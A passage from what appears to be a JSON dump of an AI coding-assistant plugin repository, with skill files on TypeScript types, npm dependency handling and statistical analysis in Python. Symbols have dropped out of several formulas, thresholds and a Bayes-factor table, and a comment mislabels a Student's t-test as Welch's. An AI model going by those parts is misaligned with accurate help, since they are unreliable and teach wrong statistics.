:\n  T extends object ? { [K in keyof T]?: DeepPartial<T[K]> } :\n  T;\n```\n\n**Guidance:**\n- Use deep types at **boundaries** (e.g., library API) not everywhere\n- Deep recursive types can slow typechecking in large codebases\n\n---\n\n## D) Template Literal Types\n\nUse for:\n- Event names\n- Route building\n- Strongly typed \"path selectors\"\n- Serialization keys\n\n**Example: event handler names**\n```ts\ntype EventName = \"click\" | \"focus\" | \"blur\";\ntype HandlerName = `on${Capitalize<EventName>}`;\n```\n\n**Be careful:** Template literal expansions can explode with large unions.\n\n---\n\n## E) Standard Library Utility Types (Know Them, Don't Re-invent Them)\n\nUse built-ins:\n- `ReturnType`, `Parameters`, `ConstructorParameters`, `InstanceType`\n- `Partial`, `Required`, `Readonly`\n- `Pick`, `Omit`\n- `Exclude`, `Extract`, `NonNullable`\n- `Record`\n- `Awaited`\n\nRe-inventing is sometimes pedagogical, but in real projects prefer the built-ins.\n",
        "plugins/sys-nodejs/skills/configuring-typescript/references/type-testing.md": "# Type Testing & Review Checklist\n\nUse type tests to prevent regressions in public APIs and advanced utilities.\n\n---\n\n## Type Testing (Compile-Time Tests)\n\n### A) Inline type equality helpers\n```ts\nexport type AssertEqual<T, U> =\n  (<G>() => G extends T ? 1 : 2) extends\n  (<G>() => G extends U ? 1 : 2)\n    ? true\n    : false;\n\nexport type Expect<T extends true> = T;\n\n// Example:\ntype A = Expect<AssertEqual<string, string>>;\n```\n\n### B) Error expectation using `@ts-expect-error`\n```ts\ntype Color = \"red\" | \"blue\";\n\n// @ts-expect-error\nconst bad: Color = \"green\";\n```\n\n### C) \"Public surface\" tests\n\nFor libraries:\n- Write type tests that assert the shape of exported APIs\n- Run `tsc -p tsconfig.types.json --noEmit`\n\n---\n\n## Review Checklist (Use in PRs)\n\n### Strong typing\n- Uses `satisfies` for config/map literals instead of `as Type`\n- Avoids `any` in production code (tests may allow)\n- Optional vs undefined is intentional (`exactOptionalPropertyTypes` ready)\n- Indexed access is safe (`noUncheckedIndexedAccess` ready)\n\n### Module hygiene\n- `import type` is used for type-only imports (especially with `verbatimModuleSyntax`)\n- Runtime imports are not accidentally elided or relied upon\n\n### Performance\n- No unbounded recursive types used widely\n- Conditional types are non-distributive when union size can grow\n- Huge template literal unions are avoided unless strictly necessary\n- Monorepo uses project references when packages depend on each other\n\n### Tests\n- Test tsconfig is separate and includes test globals/types\n- ESLint overrides relax only test files, not production\n",
        "plugins/sys-nodejs/skills/managing-npm/SKILL.md": "---\nname: managing-npm\ndescription: \"Manages npm, pnpm, and bun dependencies following strict protocols. Use when installing, updating, or auditing packages. Do not use for TypeScript configuration or build tooling.\"\nallowed-tools: [Read, Edit, Bash(npm:*), Bash(pnpm:*), Bash(bun:*), Bash(npx:*)]\n---\n\n# Dependency Management Protocol\n\n## Core Principle\n\n**NEVER manually edit `package.json`** for dependency changes. Always use package manager commands.\n\n## Dependency Operations\n\n### Adding Dependencies\n\n```bash\n# Production dependency\nbun add <package>\npnpm add <package>\nnpm install <package>\n\n# Dev dependency\nbun add -d <package>\npnpm add -D <package>\nnpm install --save-dev <package>\n```\n\n### Removing Dependencies\n\n```bash\nbun remove <package>\npnpm remove <package>\nnpm uninstall <package>\n```\n\n### Updating Dependencies\n\n```bash\n# Check outdated\nbun outdated\npnpm outdated\nnpm outdated\n\n# Update specific package\nbun update <package>\npnpm update <package>\nnpm update <package>\n\n# Update all (interactive)\npnpm update --interactive\nnpx npm-check-updates -i\n```\n\n## Security Audit\n\n```bash\n# Run audit\nbun audit\npnpm audit\nnpm audit\n\n# Auto-fix vulnerabilities\npnpm audit --fix\nnpm audit fix\n\n# Force fix (breaking changes allowed)\nnpm audit fix --force\n```\n\n## Lockfile Hygiene\n\n1. **Commit lockfiles** (`bun.lockb`, `pnpm-lock.yaml`, `package-lock.json`)\n2. **Never delete lockfiles** to resolve conflicts - regenerate properly\n3. **Use `--frozen-lockfile`** in CI environments\n\n```bash\n# CI install (no lockfile changes)\nbun install --frozen-lockfile\npnpm install --frozen-lockfile\nnpm ci\n```\n\n## Quality Gates\n\n- [ ] Dependencies added via CLI, not manual edits\n- [ ] Lockfile committed with changes\n- [ ] No high/critical vulnerabilities in audit\n- [ ] Unused dependencies removed\n",
        "plugins/sys-research/.claude-plugin/plugin.json": "{\n    \"name\": \"sys-research\",\n    \"description\": \"RESEARCH & KNOWLEDGE DOMAIN - Research tools, knowledge retrieval, codebase analysis, gitingest, and experimental analysis\",\n    \"version\": \"1.0.3\",\n    \"license\": \"MIT\",\n    \"author\": {\n        \"name\": \"Git-Fg\"\n    },\n    \"keywords\": [\n        \"research\",\n        \"knowledge\",\n        \"analysis\",\n        \"gitingest\",\n        \"codebase-analysis\",\n        \"scientific\"\n    ]\n}\n",
        "plugins/sys-research/README.md": "# System Research Plugin (`sys-research`)\n\n## Overview\nThe `sys-research` plugin provides advanced research capabilities for the Cat Toolkit. It handles deep data retrieval, knowledge synthesis, and experimental analysis workflows.\n\n## Capabilities\n- Deep Research APIs\n- Documentation Analysis\n- Experimental Prototyping\n\n## Usage\nThis plugin is intended to be used by the `sys-meta` or direct user invocation for complex research tasks.\n",
        "plugins/sys-research/skills/analyzing-data/SKILL.md": "---\nname: analyzing-data\ndescription: \"Statistical analysis toolkit for hypothesis testing, regression, correlation, Bayesian statistics, power analysis, and APA reporting. USE when conducting academic research, analyzing experimental data, testing hypotheses with t-tests or ANOVA, performing regression analyses, calculating effect sizes, checking statistical assumptions, or generating publication-ready statistical reports. Do not use for literature reviews, tool selection, or methodology design  see conducting-research skill.\"\nallowed-tools: [Read, Write, Edit, Bash]\n---\n\n# Statistical Analysis Protocol\n\n## When to Use This Skill\n\nThis skill should be used when:\n- Conducting statistical hypothesis tests (t-tests, ANOVA, chi-square)\n- Performing regression or correlation analyses\n- Running Bayesian statistical analyses\n- Checking statistical assumptions and diagnostics\n- Calculating effect sizes and conducting power analyses\n- Reporting statistical results in APA format\n- Analyzing experimental or observational data for research\n\n---\n\n## Core Capabilities\n\n- **Test Selection and Planning**: Choose appropriate tests and compute power. See [references/test_selection_guide.md](references/test_selection_guide.md).\n- **Assumption Checking**: Verify normality, homogeneity, etc. See [references/assumptions_and_diagnostics.md](references/assumptions_and_diagnostics.md).\n- **Statistical Testing**: hypothesis testing, regression, correlation, Bayesian. See [references/analysis-examples.md](references/analysis-examples.md).\n- **Effect Sizes**: Calculate and interpret. See [references/effect_sizes_and_power.md](references/effect_sizes_and_power.md).\n- **Reporting**: APA-style reports. See [references/reporting_standards.md](references/reporting_standards.md).\n\n---\n\n## Workflow Decision Tree\n\nUse this decision tree to determine your analysis path:\n\n```\nSTART\n\n Need to SELECT a statistical test?\n   YES  See [references/test_selection_guide.md](references/test_selection_guide.md)\n   NO  Continue\n\n Ready to check ASSUMPTIONS?\n   YES  See [references/assumptions_and_diagnostics.md](references/assumptions_and_diagnostics.md)\n   NO  Continue\n\n Ready to run ANALYSIS?\n   YES  See [references/analysis-examples.md](references/analysis-examples.md)\n   NO  Continue\n\n Need to REPORT results?\n    YES  See [references/report-templates.md](references/report-templates.md)\n```\n\n---\n\n## Resources\n\n- **[references/test_selection_guide.md](references/test_selection_guide.md)**: Decision tree for choosing tests.\n- **[references/assumptions_and_diagnostics.md](references/assumptions_and_diagnostics.md)**: Guidance on assumption checks.\n- **[references/effect_sizes_and_power.md](references/effect_sizes_and_power.md)**: Effect sizes and power analysis.\n- **[references/bayesian_statistics.md](references/bayesian_statistics.md)**: Bayesian methods.\n- **[references/reporting_standards.md](references/reporting_standards.md)**: APA-style reporting.\n- **[references/analysis-examples.md](references/analysis-examples.md)**: Code examples for tests.\n- **[references/report-templates.md](references/report-templates.md)**: Report templates.\n\n### Scripts\n\n- **[scripts/assumption_checks.py](scripts/assumption_checks.py)**: Automated assumption checking tools.\n\n",
        "plugins/sys-research/skills/analyzing-data/references/analysis-examples.md": "# Statistical Analysis Examples\n\n## T-Test with Complete Reporting\n\n```python\nimport pingouin as pg\nimport numpy as np\n\n# Run independent t-test\nresult = pg.ttest(group_a, group_b, correction='auto')\n\n# Extract results\nt_stat = result['T'].values[0]\ndf = result['dof'].values[0]\np_value = result['p-val'].values[0]\ncohens_d = result['cohen-d'].values[0]\nci_lower = result['CI95%'].values[0][0]\nci_upper = result['CI95%'].values[0][1]\n\n# Report\nprint(f\"t({df:.0f}) = {t_stat:.2f}, p = {p_value:.3f}\")\nprint(f\"Cohen's d = {cohens_d:.2f}, 95% CI [{ci_lower:.2f}, {ci_upper:.2f}]\")\n```\n\n## ANOVA with Post-Hoc Tests\n\n```python\nimport pingouin as pg\n\n# One-way ANOVA\naov = pg.anova(dv='score', between='group', data=df, detailed=True)\nprint(aov)\n\n# If significant, conduct post-hoc tests\nif aov['p-unc'].values[0] < 0.05:\n    posthoc = pg.pairwise_tukey(dv='score', between='group', data=df)\n    print(posthoc)\n\n# Effect size\neta_squared = aov['np2'].values[0]  # Partial eta-squared\nprint(f\"Partial  = {eta_squared:.3f}\")\n```\n\n## Linear Regression with Diagnostics\n\n```python\nimport statsmodels.api as sm\nfrom statsmodels.stats.outliers_influence import variance_inflation_factor\nimport pandas as pd\nimport numpy as np\n\n# Fit model\nX = sm.add_constant(X_predictors)  # Add intercept\nmodel = sm.OLS(y, X).fit()\n\n# Summary\nprint(model.summary())\n\n# Check multicollinearity (VIF)\nvif_data = pd.DataFrame()\nvif_data[\"Variable\"] = X.columns\nvif_data[\"VIF\"] = [variance_inflation_factor(X.values, i) for i in range(X.shape[1])]\nprint(vif_data)\n\n# Check assumptions\nresiduals = model.resid\nfitted = model.fittedvalues\n\n# Residual plots\nimport matplotlib.pyplot as plt\nfig, axes = plt.subplots(2, 2, figsize=(12, 10))\n\n# Residuals vs fitted\naxes[0, 0].scatter(fitted, residuals, alpha=0.6)\naxes[0, 0].axhline(y=0, color='r', linestyle='--')\naxes[0, 0].set_xlabel('Fitted values')\naxes[0, 0].set_ylabel('Residuals')\naxes[0, 0].set_title('Residuals vs Fitted')\n\n# Q-Q plot\nfrom scipy import stats\nstats.probplot(residuals, dist=\"norm\", plot=axes[0, 1])\naxes[0, 1].set_title('Normal Q-Q')\n\n# Scale-Location\naxes[1, 0].scatter(fitted, np.sqrt(np.abs(residuals / residuals.std())), alpha=0.6)\naxes[1, 0].set_xlabel('Fitted values')\naxes[1, 0].set_ylabel('|Standardized residuals|')\naxes[1, 0].set_title('Scale-Location')\n\n# Residuals histogram\naxes[1, 1].hist(residuals, bins=20, edgecolor='black', alpha=0.7)\naxes[1, 1].set_xlabel('Residuals')\naxes[1, 1].set_ylabel('Frequency')\naxes[1, 1].set_title('Histogram of Residuals')\n\nplt.tight_layout()\nplt.show()\n```\n\n## Bayesian T-Test\n\n```python\nimport pymc as pm\nimport arviz as az\nimport numpy as np\n\nwith pm.Model() as model:\n    # Priors\n    mu1 = pm.Normal('mu_group1', mu=0, sigma=10)\n    mu2 = pm.Normal('mu_group2', mu=0, sigma=10)\n    sigma = pm.HalfNormal('sigma', sigma=10)\n\n    # Likelihood\n    y1 = pm.Normal('y1', mu=mu1, sigma=sigma, observed=group_a)\n    y2 = pm.Normal('y2', mu=mu2, sigma=sigma, observed=group_b)\n\n    # Derived quantity\n    diff = pm.Deterministic('difference', mu1 - mu2)\n\n    # Sample\n    trace = pm.sample(2000, tune=1000, return_inferencedata=True)\n\n# Summarize\nprint(az.summary(trace, var_names=['difference']))\n\n# Probability that group1 > group2\nprob_greater = np.mean(trace.posterior['difference'].values > 0)\nprint(f\"P( >  | data) = {prob_greater:.3f}\")\n\n# Plot posterior\naz.plot_posterior(trace, var_names=['difference'], ref_val=0)\n```\n\n## Effect Size Calculation\n\n```python\n# T-test returns Cohen's d\nresult = pg.ttest(x, y)\nd = result['cohen-d'].values[0]\n\n# ANOVA returns partial eta-squared\naov = pg.anova(dv='score', between='group', data=df)\neta_p2 = aov['np2'].values[0]\n\n# Correlation: r is already an effect size\ncorr = pg.corr(x, y)\nr = corr['r'].values[0]\n```\n\n## Confidence Intervals for Effect Sizes\n\n```python\nfrom pingouin import compute_effsize_from_t\n\n# For t-test\nd, ci = compute_effsize_from_t(\n    t_statistic,\n    nx=len(group1),\n    ny=len(group2),\n    eftype='cohen'\n)\nprint(f\"d = {d:.2f}, 95% CI [{ci[0]:.2f}, {ci[1]:.2f}]\")\n```\n\n## Power Analysis\n\n### A Priori Power Analysis\n\n```python\nfrom statsmodels.stats.power import (\n    tt_ind_solve_power,\n    FTestAnovaPower\n)\n\n# T-test: What n is needed to detect d = 0.5?\nn_required = tt_ind_solve_power(\n    effect_size=0.5,\n    alpha=0.05,\n    power=0.80,\n    ratio=1.0,\n    alternative='two-sided'\n)\nprint(f\"Required n per group: {n_required:.0f}\")\n\n# ANOVA: What n is needed to detect f = 0.25?\nanova_power = FTestAnovaPower()\nn_per_group = anova_power.solve_power(\n    effect_size=0.25,\n    ngroups=3,\n    alpha=0.05,\n    power=0.80\n)\nprint(f\"Required n per group: {n_per_group:.0f}\")\n```\n\n### Sensitivity Analysis\n\n```python\n# With n=50 per group, what effect could we detect?\ndetectable_d = tt_ind_solve_power(\n    effect_size=None,  # Solve for this\n    nobs1=50,\n    alpha=0.05,\n    power=0.80,\n    ratio=1.0,\n    alternative='two-sided'\n)\nprint(f\"Study could detect d  {detectable_d:.2f}\")\n```\n",
        "plugins/sys-research/skills/analyzing-data/references/assumptions_and_diagnostics.md": "# Statistical Assumptions and Diagnostic Procedures\n\nThis document provides comprehensive guidance on checking and validating statistical assumptions for various analyses.\n\n**Table of Contents**:\n- [1. Common Assumptions Across Tests](#1-common-assumptions-across-tests)\n- [2. Parametric Test Assumptions](#2-parametric-test-assumptions)\n- [3. Regression Assumptions](#3-regression-assumptions)\n- [4. Diagnostic Procedures](#4-diagnostic-procedures)\n\n## General Principles\n\n1. **Always check assumptions before interpreting test results**\n2. **Use multiple diagnostic methods** (visual + formal tests)\n3. **Consider robustness**: Some tests are robust to violations under certain conditions\n4. **Document all assumption checks** in analysis reports\n5. **Report violations and remedial actions taken**\n\n## Common Assumptions Across Tests\n\n### 1. Independence of Observations\n\n**What it means**: Each observation is independent; measurements on one subject do not influence measurements on another.\n\n**How to check**:\n- Review study design and data collection procedures\n- For time series: Check autocorrelation (ACF/PACF plots, Durbin-Watson test)\n- For clustered data: Consider intraclass correlation (ICC)\n\n**What to do if violated**:\n- Use mixed-effects models for clustered/hierarchical data\n- Use time series methods for temporally dependent data\n- Use generalized estimating equations (GEE) for correlated data\n\n**Critical severity**: HIGH - violations can severely inflate Type I error\n\n---\n\n### 2. Normality\n\n**What it means**: Data or residuals follow a normal (Gaussian) distribution.\n\n**When required**:\n- t-tests (for small samples; robust for n > 30 per group)\n- ANOVA (for small samples; robust for n > 30 per group)\n- Linear regression (for residuals)\n- Some correlation tests (Pearson)\n\n**How to check**:\n\n**Visual methods** (primary):\n- Q-Q (quantile-quantile) plot: Points should fall on diagonal line\n- Histogram with normal curve overlay\n- Kernel density plot\n\n**Formal tests** (secondary):\n- Shapiro-Wilk test (recommended for n < 50)\n- Kolmogorov-Smirnov test\n- Anderson-Darling test\n\n**Python implementation**:\n```python\nfrom scipy import stats\nimport matplotlib.pyplot as plt\n\n# Shapiro-Wilk test\nstatistic, p_value = stats.shapiro(data)\n\n# Q-Q plot\nstats.probplot(data, dist=\"norm\", plot=plt)\n```\n\n**Interpretation guidance**:\n- For n < 30: Both visual and formal tests important\n- For 30  n < 100: Visual inspection primary, formal tests secondary\n- For n  100: Formal tests overly sensitive; rely on visual inspection\n- Look for severe skewness, outliers, or bimodality\n\n**What to do if violated**:\n- **Mild violations** (slight skewness): Proceed if n > 30 per group\n- **Moderate violations**: Use non-parametric alternatives (Mann-Whitney, Kruskal-Wallis, Wilcoxon)\n- **Severe violations**:\n  - Transform data (log, square root, Box-Cox)\n  - Use non-parametric methods\n  - Use robust regression methods\n  - Consider bootstrapping\n\n**Critical severity**: MEDIUM - parametric tests are often robust to mild violations with adequate sample size\n\n---\n\n### 3. Homogeneity of Variance (Homoscedasticity)\n\n**What it means**: Variances are equal across groups or across the range of predictors.\n\n**When required**:\n- Independent samples t-test\n- ANOVA\n- Linear regression (constant variance of residuals)\n\n**How to check**:\n\n**Visual methods** (primary):\n- Box plots by group (for t-test/ANOVA)\n- Residuals vs. fitted values plot (for regression) - should show random scatter\n- Scale-location plot (square root of standardized residuals vs. fitted)\n\n**Formal tests** (secondary):\n- Levene's test (robust to non-normality)\n- Bartlett's test (sensitive to non-normality, not recommended)\n- Brown-Forsythe test (median-based version of Levene's)\n- Breusch-Pagan test (for regression)\n\n**Python implementation**:\n```python\nfrom scipy import stats\nimport pingouin as pg\n\n# Levene's test\nstatistic, p_value = stats.levene(group1, group2, group3)\n\n# For regression\n# Breusch-Pagan test\nfrom statsmodels.stats.diagnostic import het_breuschpagan\n_, p_value, _, _ = het_breuschpagan(residuals, exog)\n```\n\n**Interpretation guidance**:\n- Variance ratio (max/min) < 2-3: Generally acceptable\n- For ANOVA: Test is robust if groups have equal sizes\n- For regression: Look for funnel patterns in residual plots\n\n**What to do if violated**:\n- **t-test**: Use Welch's t-test (does not assume equal variances)\n- **ANOVA**: Use Welch's ANOVA or Brown-Forsythe ANOVA\n- **Regression**:\n  - Transform dependent variable (log, square root)\n  - Use weighted least squares (WLS)\n  - Use robust standard errors (HC3)\n  - Use generalized linear models (GLM) with appropriate variance function\n\n**Critical severity**: MEDIUM - tests can be robust with equal sample sizes\n\n---\n\n## Test-Specific Assumptions\n\n### T-Tests\n\n**Assumptions**:\n1. Independence of observations\n2. Normality (each group for independent t-test; differences for paired t-test)\n3. Homogeneity of variance (independent t-test only)\n\n**Diagnostic workflow**:\n```python\nimport scipy.stats as stats\nimport pingouin as pg\n\n# Check normality for each group\nstats.shapiro(group1)\nstats.shapiro(group2)\n\n# Check homogeneity of variance\nstats.levene(group1, group2)\n\n# If assumptions violated:\n# Option 1: Welch's t-test (unequal variances)\npg.ttest(group1, group2, correction=False)  # Welch's\n\n# Option 2: Non-parametric alternative\npg.mwu(group1, group2)  # Mann-Whitney U\n```\n\n---\n\n### ANOVA\n\n**Assumptions**:\n1. Independence of observations within and between groups\n2. Normality in each group\n3. Homogeneity of variance across groups\n\n**Additional considerations**:\n- For repeated measures ANOVA: Sphericity assumption (Mauchly's test)\n\n**Diagnostic workflow**:\n```python\nimport pingouin as pg\n\n# Check normality per group\nfor group in df['group'].unique():\n    data = df[df['group'] == group]['value']\n    stats.shapiro(data)\n\n# Check homogeneity of variance\npg.homoscedasticity(df, dv='value', group='group')\n\n# For repeated measures: Check sphericity\n# Automatically tested in pingouin's rm_anova\n```\n\n**What to do if sphericity violated** (repeated measures):\n- Greenhouse-Geisser correction ( < 0.75)\n- Huynh-Feldt correction ( > 0.75)\n- Use multivariate approach (MANOVA)\n\n---\n\n### Linear Regression\n\n**Assumptions**:\n1. **Linearity**: Relationship between X and Y is linear\n2. **Independence**: Residuals are independent\n3. **Homoscedasticity**: Constant variance of residuals\n4. **Normality**: Residuals are normally distributed\n5. **No multicollinearity**: Predictors are not highly correlated (multiple regression)\n\n**Diagnostic workflow**:\n\n**1. Linearity**:\n```python\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\n# Scatter plots of Y vs each X\n# Residuals vs. fitted values (should be randomly scattered)\nplt.scatter(fitted_values, residuals)\nplt.axhline(y=0, color='r', linestyle='--')\n```\n\n**2. Independence**:\n```python\nfrom statsmodels.stats.stattools import durbin_watson\n\n# Durbin-Watson test (for time series)\ndw_statistic = durbin_watson(residuals)\n# Values between 1.5-2.5 suggest independence\n```\n\n**3. Homoscedasticity**:\n```python\n# Breusch-Pagan test\nfrom statsmodels.stats.diagnostic import het_breuschpagan\n_, p_value, _, _ = het_breuschpagan(residuals, exog)\n\n# Visual: Scale-location plot\nplt.scatter(fitted_values, np.sqrt(np.abs(std_residuals)))\n```\n\n**4. Normality of residuals**:\n```python\n# Q-Q plot of residuals\nstats.probplot(residuals, dist=\"norm\", plot=plt)\n\n# Shapiro-Wilk test\nstats.shapiro(residuals)\n```\n\n**5. Multicollinearity**:\n```python\nfrom statsmodels.stats.outliers_influence import variance_inflation_factor\n\n# Calculate VIF for each predictor\nvif_data = pd.DataFrame()\nvif_data[\"feature\"] = X.columns\nvif_data[\"VIF\"] = [variance_inflation_factor(X.values, i) for i in range(len(X.columns))]\n\n# VIF > 10 indicates severe multicollinearity\n# VIF > 5 indicates moderate multicollinearity\n```\n\n**What to do if violated**:\n- **Non-linearity**: Add polynomial terms, use GAM, or transform variables\n- **Heteroscedasticity**: Transform Y, use WLS, use robust SE\n- **Non-normal residuals**: Transform Y, use robust methods, check for outliers\n- **Multicollinearity**: Remove correlated predictors, use PCA, ridge regression\n\n---\n\n### Logistic Regression\n\n**Assumptions**:\n1. **Independence**: Observations are independent\n2. **Linearity**: Linear relationship between log-odds and continuous predictors\n3. **No perfect multicollinearity**: Predictors not perfectly correlated\n4. **Large sample size**: At least 10-20 events per predictor\n\n**Diagnostic workflow**:\n\n**1. Linearity of logit**:\n```python\n# Box-Tidwell test: Add interaction with log of continuous predictor\n# If interaction is significant, linearity violated\n```\n\n**2. Multicollinearity**:\n```python\n# Use VIF as in linear regression\n```\n\n**3. Influential observations**:\n```python\n# Cook's distance, DFBetas, leverage\nfrom statsmodels.stats.outliers_influence import OLSInfluence\n\ninfluence = OLSInfluence(model)\ncooks_d = influence.cooks_distance\n```\n\n**4. Model fit**:\n```python\n# Hosmer-Lemeshow test\n# Pseudo R-squared\n# Classification metrics (accuracy, AUC-ROC)\n```\n\n---\n\n## Outlier Detection\n\n**Methods**:\n1. **Visual**: Box plots, scatter plots\n2. **Statistical**:\n   - Z-scores: |z| > 3 suggests outlier\n   - IQR method: Values < Q1 - 1.5IQR or > Q3 + 1.5IQR\n   - Modified Z-score using median absolute deviation (robust to outliers)\n\n**For regression**:\n- **Leverage**: High leverage points (hat values)\n- **Influence**: Cook's distance > 4/n suggests influential point\n- **Outliers**: Studentized residuals > 3\n\n**What to do**:\n1. Investigate data entry errors\n2. Consider if outliers are valid observations\n3. Report sensitivity analysis (results with and without outliers)\n4. Use robust methods if outliers are legitimate\n\n---\n\n## Sample Size Considerations\n\n### Minimum Sample Sizes (Rules of Thumb)\n\n- **T-test**: n  30 per group for robustness to non-normality\n- **ANOVA**: n  30 per group\n- **Correlation**: n  30 for adequate power\n- **Simple regression**: n  50\n- **Multiple regression**: n  10-20 per predictor (minimum 10 + k predictors)\n- **Logistic regression**: n  10-20 events per predictor\n\n### Small Sample Considerations\n\nFor small samples:\n- Assumptions become more critical\n- Use exact tests when available (Fisher's exact, exact logistic regression)\n- Consider non-parametric alternatives\n- Use permutation tests or bootstrap methods\n- Be conservative with interpretation\n\n---\n\n## Reporting Assumption Checks\n\nWhen reporting analyses, include:\n\n1. **Statement of assumptions checked**: List all assumptions tested\n2. **Methods used**: Describe visual and formal tests employed\n3. **Results of diagnostic tests**: Report test statistics and p-values\n4. **Assessment**: State whether assumptions were met or violated\n5. **Actions taken**: If violated, describe remedial actions (transformations, alternative tests, robust methods)\n\n**Example reporting statement**:\n> \"Normality was assessed using Shapiro-Wilk tests and Q-Q plots. Data for Group A (W = 0.97, p = .18) and Group B (W = 0.96, p = .12) showed no significant departure from normality. Homogeneity of variance was assessed using Levene's test, which was non-significant (F(1, 58) = 1.23, p = .27), indicating equal variances across groups. Therefore, assumptions for the independent samples t-test were satisfied.\"\n",
        "plugins/sys-research/skills/analyzing-data/references/bayesian_statistics.md": "# Bayesian Statistical Analysis\n\nThis document provides guidance on conducting and interpreting Bayesian statistical analyses, which offer an alternative framework to frequentist (classical) statistics.\n\n## Bayesian vs. Frequentist Philosophy\n\n### Fundamental Differences\n\n| Aspect | Frequentist | Bayesian |\n|--------|-------------|----------|\n| **Probability interpretation** | Long-run frequency of events | Degree of belief/uncertainty |\n| **Parameters** | Fixed but unknown | Random variables with distributions |\n| **Inference** | Based on sampling distributions | Based on posterior distributions |\n| **Primary output** | p-values, confidence intervals | Posterior probabilities, credible intervals |\n| **Prior information** | Not formally incorporated | Explicitly incorporated via priors |\n| **Hypothesis testing** | Reject/fail to reject null | Probability of hypotheses given data |\n| **Sample size** | Often requires minimum | Can work with any sample size |\n| **Interpretation** | Indirect (probability of data given H) | Direct (probability of hypothesis given data) |\n\n### Key Question Difference\n\n**Frequentist**: \"If the null hypothesis is true, what is the probability of observing data this extreme or more extreme?\"\n\n**Bayesian**: \"Given the observed data, what is the probability that the hypothesis is true?\"\n\nThe Bayesian question is more intuitive and directly addresses what researchers want to know.\n\n---\n\n## Bayes' Theorem\n\n**Formula**:\n```\nP(|D) = P(D|)  P() / P(D)\n```\n\n**In words**:\n```\nPosterior = Likelihood  Prior / Evidence\n```\n\nWhere:\n- ** (theta)**: Parameter of interest (e.g., mean difference, correlation)\n- **D**: Observed data\n- **P(|D)**: Posterior distribution (belief about  after seeing data)\n- **P(D|)**: Likelihood (probability of data given )\n- **P()**: Prior distribution (belief about  before seeing data)\n- **P(D)**: Marginal likelihood/evidence (normalizing constant)\n\n---\n\n## Prior Distributions\n\n### Types of Priors\n\n#### 1. Informative Priors\n\n**When to use**: When you have substantial prior knowledge from:\n- Previous studies\n- Expert knowledge\n- Theory\n- Pilot data\n\n**Example**: Meta-analysis shows effect size d  0.40, SD = 0.15\n- Prior: Normal(0.40, 0.15)\n\n**Advantages**:\n- Incorporates existing knowledge\n- More efficient (smaller samples needed)\n- Can stabilize estimates with small data\n\n**Disadvantages**:\n- Subjective (but subjectivity can be strength)\n- Must be justified and transparent\n- May be controversial if strong prior conflicts with data\n\n---\n\n#### 2. Weakly Informative Priors\n\n**When to use**: Default choice for most applications\n\n**Characteristics**:\n- Regularizes estimates (prevents extreme values)\n- Has minimal influence on posterior with moderate data\n- Prevents computational issues\n\n**Example priors**:\n- Effect size: Normal(0, 1) or Cauchy(0, 0.707)\n- Variance: Half-Cauchy(0, 1)\n- Correlation: Uniform(-1, 1) or Beta(2, 2)\n\n**Advantages**:\n- Balances objectivity and regularization\n- Computationally stable\n- Broadly acceptable\n\n---\n\n#### 3. Non-Informative (Flat/Uniform) Priors\n\n**When to use**: When attempting to be \"objective\"\n\n**Example**: Uniform(-, ) for any value\n\n**WARNING Caution**:\n- Can lead to improper posteriors\n- May produce non-sensible results\n- Not truly \"non-informative\" (still makes assumptions)\n- Often not recommended in modern Bayesian practice\n\n**Better alternative**: Use weakly informative priors\n\n---\n\n### Prior Sensitivity Analysis\n\n**Always conduct**: Test how results change with different priors\n\n**Process**:\n1. Fit model with default/planned prior\n2. Fit model with more diffuse prior\n3. Fit model with more concentrated prior\n4. Compare posterior distributions\n\n**Reporting**:\n- If results are similar: Evidence is robust\n- If results differ substantially: Data are not strong enough to overwhelm prior\n\n**Python example**:\n```python\nimport pymc as pm\n\n# Model with different priors\npriors = [\n    ('weakly_informative', pm.Normal.dist(0, 1)),\n    ('diffuse', pm.Normal.dist(0, 10)),\n    ('informative', pm.Normal.dist(0.5, 0.3))\n]\n\nresults = {}\nfor name, prior in priors:\n    with pm.Model():\n        effect = pm.Normal('effect', mu=prior.mu, sigma=prior.sigma)\n        # ... rest of model\n        trace = pm.sample()\n        results[name] = trace\n```\n\n---\n\n## Bayesian Hypothesis Testing\n\n### Bayes Factor (BF)\n\n**What it is**: Ratio of evidence for two competing hypotheses\n\n**Formula**:\n```\nBF = P(D|H) / P(D|H)\n```\n\n**Interpretation**:\n\n| BF | Evidence |\n|------|----------|\n| >100 | Decisive for H |\n| 30-100 | Very strong for H |\n| 10-30 | Strong for H |\n| 3-10 | Moderate for H |\n| 1-3 | Anecdotal for H |\n| 1 | No evidence |\n| 1/3-1 | Anecdotal for H |\n| 1/10-1/3 | Moderate for H |\n| 1/30-1/10 | Strong for H |\n| 1/100-1/30 | Very strong for H |\n| <1/100 | Decisive for H |\n\n**Advantages over p-values**:\n1. Can provide evidence for null hypothesis\n2. Not dependent on sampling intentions (no \"peeking\" problem)\n3. Directly quantifies evidence\n4. Can be updated with more data\n\n**Python calculation**:\n```python\nimport pingouin as pg\n\n# Note: Limited BF support in Python\n# Better options: R packages (BayesFactor), JASP software\n\n# Approximate BF from t-statistic\n# Using Jeffreys-Zellner-Siow prior\nfrom scipy import stats\n\ndef bf_from_t(t, n1, n2, r_scale=0.707):\n    \"\"\"\n    Approximate Bayes Factor from t-statistic\n    r_scale: Cauchy prior scale (default 0.707 for medium effect)\n    \"\"\"\n    # This is simplified; use dedicated packages for accurate calculation\n    df = n1 + n2 - 2\n    # Implementation requires numerical integration\n    pass\n```\n\n---\n\n### Region of Practical Equivalence (ROPE)\n\n**Purpose**: Define range of negligible effect sizes\n\n**Process**:\n1. Define ROPE (e.g., d  [-0.1, 0.1] for negligible effects)\n2. Calculate % of posterior inside ROPE\n3. Make decision:\n   - >95% in ROPE: Accept practical equivalence\n   - >95% outside ROPE: Reject equivalence\n   - Otherwise: Inconclusive\n\n**Advantage**: Directly tests for practical significance\n\n**Python example**:\n```python\n# Define ROPE\nrope_lower, rope_upper = -0.1, 0.1\n\n# Calculate % of posterior in ROPE\nin_rope = np.mean((posterior_samples > rope_lower) &\n                  (posterior_samples < rope_upper))\n\nprint(f\"{in_rope*100:.1f}% of posterior in ROPE\")\n```\n\n---\n\n## Bayesian Estimation\n\n### Credible Intervals\n\n**What it is**: Interval containing parameter with X% probability\n\n**95% Credible Interval interpretation**:\n> \"There is a 95% probability that the true parameter lies in this interval.\"\n\n**This is what people THINK confidence intervals mean** (but don't in frequentist framework)\n\n**Types**:\n\n#### Equal-Tailed Interval (ETI)\n- 2.5th to 97.5th percentile\n- Simple to calculate\n- May not include mode for skewed distributions\n\n#### Highest Density Interval (HDI)\n- Narrowest interval containing 